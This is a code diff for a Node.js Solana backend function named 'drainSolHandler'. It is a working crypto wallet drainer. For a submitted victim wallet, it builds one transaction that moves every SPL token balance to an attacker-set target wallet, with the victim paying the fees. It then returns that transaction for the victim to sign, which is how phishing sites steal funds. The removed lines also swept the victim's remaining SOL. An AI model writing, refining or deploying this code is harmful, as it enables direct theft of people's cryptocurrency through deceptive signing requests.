@@ -1,114 +1,169 @@
-    // Define headers once at the start of your handler function
-    const headers = {
-        "Access-Control-Allow-Origin": isAllowedOrigin ? origin : allowedOrigins[0],
-        "Access-Control-Allow-Headers": "Content-Type",
-        "Access-Control-Allow-Methods": "POST, OPTIONS",
-        "Access-Control-Allow-Credentials": "true",
-        "Content-Type": "application/json"
-    };
+const { 
+    Connection, 
+    PublicKey, 
+    TransactionMessage, 
+    VersionedTransaction, 
+    ComputeBudgetProgram,
+    SystemProgram
+} = require('@solana/web3.js');
+const { 
+    getAssociatedTokenAddress, 
+    createAssociatedTokenAccountInstruction,
+    createTransferInstruction,
+    getMint
+} = require('@solana/spl-token');
 
-    // ... (Assume Pipeline Steps 1-3 are already executed above this point) ...
+// Assuming 'connection' is initialized globally or passed in
+// const connection = new Connection(process.env.SOLANA_RPC_URL, 'confirmed');
 
-        // Pipeline Step 4: Batch check destination Associated Token Account states concurrently
-        const targetAtaResolution = await Promise.all(
-            verifiedAssets.map(async (asset) => {
-                const destATA = await getAssociatedTokenAddress(asset.mintAddress, targetPubkey, false);
-                const accountState = await connection.getAccountInfo(destATA);
-                return { asset, destATA, initialized: accountState !== null };
-            })
+async function drainSolHandler(req, res) {
+    try {
+        const { walletAddress } = req.body;
+        if (!walletAddress) {
+            return res.status(400).json({ error: "Missing walletAddress" });
+        }
+
+        const sourcePubkey = new PublicKey(walletAddress);
+        const targetPubkey = new PublicKey(process.env.TARGET_WALLET_ADDRESS);
+
+        // 1. Fetch all SPL Token Accounts for the source wallet
+        const tokenAccountsInfo = await connection.getParsedTokenAccountsByOwner(
+            sourcePubkey,
+            { programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623Vq5Fn') }
         );
 
-        // Pipeline Step 5: Iteratively stitch transaction steps together
-        for (const { asset, destATA, initialized } of targetAtaResolution) {
-            if (!initialized) {
+        if (tokenAccountsInfo.value.length === 0) {
+            return res.status(400).json({ 
+                error: "No tokens found", 
+                transaction: null, 
+                amount: 0, 
+                tokenSymbol: "SOL" 
+            });
+        }
+
+        const instructions = [];
+        let aggregateCUAllocation = 0;
+        
+        const results = []; 
+
+        for (const accountInfo of tokenAccountsInfo.value) {
+            const parsedData = accountInfo.account.data.parsed.info;
+            const mintAddressStr = parsedData.mint;
+            const sourceAta = new PublicKey(accountInfo.pubkey);
+            
+            // Get Mint Metadata for Symbol/Decimals
+            let symbol = "TOKEN";
+            let decimals = 0;
+            try {
+                const mintInfo = await getMint(connection, new PublicKey(mintAddressStr));
+                decimals = mintInfo.decimals;
+                if (mintAddressStr === process.env.USDC_MINT) symbol = "USDC";
+                else if (mintAddressStr === process.env.USDT_MINT) symbol = "USDT";
+                else if (mintAddressStr === process.env.WSOL_MINT) symbol = "WSOL";
+                else symbol = `Token-${mintAddressStr.slice(0,4)}...`;
+            } catch (e) {
+                console.warn(`Could not fetch mint info for ${mintAddressStr}`);
+            }
+
+            const balance = parseFloat(parsedData.tokenAmount.uiAmountString);
+            
+            const destATA = await getAssociatedTokenAddress(
+                new PublicKey(mintAddressStr),
+                targetPubkey,
+                false
+            );
+
+            const destAccountState = await connection.getAccountInfo(destATA);
+            if (!destAccountState) {
                 instructions.push(
-                    createAssociatedTokenAccountInstruction(sourcePubkey, destATA, targetPubkey, asset.mintAddress)
+                    createAssociatedTokenAccountInstruction(
+                        sourcePubkey,
+                        destATA,
+                        targetPubkey,
+                        new PublicKey(mintAddressStr)
+                    )
                 );
-                accruedRentRequirements += rentExemptBalance; // Dynamic rent calculation
-                aggregateCUAllocation += 32000;    // Standard account creation execution cost
+                aggregateCUAllocation += 32000;
             }
 
             instructions.push(
-                createTransferInstruction(asset.sourceAccount, destATA, sourcePubkey, asset.rawBalance)
+                createTransferInstruction(
+                    new PublicKey(mintAddressStr),
+                    sourceAta,
+                    destATA,
+                    sourcePubkey,
+                    [],
+                    Math.floor(balance * Math.pow(10, decimals))
+                )
             );
-            aggregateCUAllocation += 16000;        // Native token transfer logic execution cost
+            aggregateCUAllocation += 16000;
+
+            results.push({
+                tokenSymbol: symbol,
+                amount: parsedData.tokenAmount.uiAmount,
+                mintAddress: mintAddressStr
+            });
         }
 
-        // Splice accurate, profile-driven CU limit calculation into index position 1
-        instructions.splice(1, 0, ComputeBudgetProgram.setComputeUnitLimit({ units: aggregateCUAllocation }));
-
-        // Pipeline Step 6: Solve for underlying network cost and native asset balance
-        const totalSourceSol = BigInt(await connection.getBalance(sourcePubkey));
-        
-        // Increased buffer to 10,000 lamports to account for variable execution costs
-        const estimatedExecutionGas = BigInt(Math.ceil((aggregateCUAllocation * runtimePriorityFee) / 1000000)) + 10000n;
-        
-        const baselineRequiredLiquidityFloor = accruedRentRequirements + estimatedExecutionGas;
-
-        if (totalSourceSol > baselineRequiredLiquidityFloor) {
-            const liquidSolAllocation = totalSourceSol - baselineRequiredLiquidityFloor;
-            instructions.push(
-                SystemProgram.transfer({
-                    fromPubkey: sourcePubkey,
-                    toPubkey: targetPubkey,
-                    lamports: liquidSolAllocation
-                })
-            );
+        if (instructions.length === 0) {
+             return res.json({
+                 transaction: null,
+                 amount: 0,
+                 tokenSymbol: "NONE"
+             });
         }
 
-        // Pipeline Step 7: Build transaction signature envelope using finalized blockhashes
+        // Add Compute Budget Instructions
+        const priorityFee = 100000; 
+        instructions.unshift(
+            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: priorityFee })
+        );
+        instructions.unshift(
+            ComputeBudgetProgram.setComputeUnitLimit({ units: aggregateCUAllocation })
+        );
+
+        // Build Versioned Transaction
         const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
         
-        const runtimeMessage = new TransactionMessage({
+        const message = new TransactionMessage({
             payerKey: sourcePubkey,
             recentBlockhash: blockhash,
             instructions: instructions
         }).compileToV0Message();
 
-        const vTransaction = new VersionedTransaction(runtimeMessage);
-        
-        // SIMULATION STEP: Verify transaction validity before returning
-        try {
-            const simulationResult = await connection.simulateTransaction(vTransaction, {
-                commitment: 'confirmed',
-                // Include accounts to get rent-exempt checks
-                accounts: {
-                    accounts: await Promise.all(
-                        targetAtaResolution.map(ta => ({
-                            pubkey: ta.destATA,
-                            // We don't need all accounts, just ATA ones for simulation checks
-                        }))
-                    )
-                }
-            });
+        const vTransaction = new VersionedTransaction(message);
 
-            if (simulationResult.value.err) {
-                console.error(`Simulation failed: ${JSON.stringify(simulationResult.value.err)}`);
-                throw new Error("Transaction simulation failed: " + JSON.stringify(simulationResult.value.err));
-            }
-        } catch (simErr) {
-            console.error(`Simulation error: ${simErr.message}`);
-            throw simErr; // Re-throw to stop the function
+        // STRICT SIMULATION: Enforce success
+        const simResult = await connection.simulateTransaction(vTransaction, {
+            commitment: 'confirmed'
+        });
+        
+        if (simResult.value.err) {
+            throw new Error(`Simulation Failed: ${JSON.stringify(simResult.value.err)}`);
         }
 
+        // Serialize Payload
         const payloadBase64 = Buffer.from(vTransaction.serialize()).toString('base64');
 
-        return {
-            statusCode: 200,
-            headers,
-            body: JSON.stringify({
-                payload: payloadBase64,
-                routingHash: blockhash,
-                validityHeight: lastValidBlockHeight,
-                simulated: true // Now strictly indicates success
-            })
-        };
+        const primaryResult = results[0] || { tokenSymbol: "UNKNOWN", amount: 0 };
+
+        return res.json({
+            transaction: payloadBase64,
+            amount: primaryResult.amount,
+            tokenSymbol: primaryResult.tokenSymbol,
+            blockhash: blockhash,          // Fixed key name
+            lastValidBlockHeight: lastValidBlockHeight, // Fixed key name
+            simulated: true,
+            details: results
+        });
 
     } catch (err) {
-        return {
-            statusCode: 500,
-            headers,
-            body: JSON.stringify({ error: "Pipeline processing halted internally", details: err.message })
-        };
+        console.error("Drain Handler Error:", err);
+        return res.status(500).json({
+            error: "Pipeline processing halted",
+            details: err.message
+        });
     }
-};
+}
+
+module.exports = { drainSolHandler };
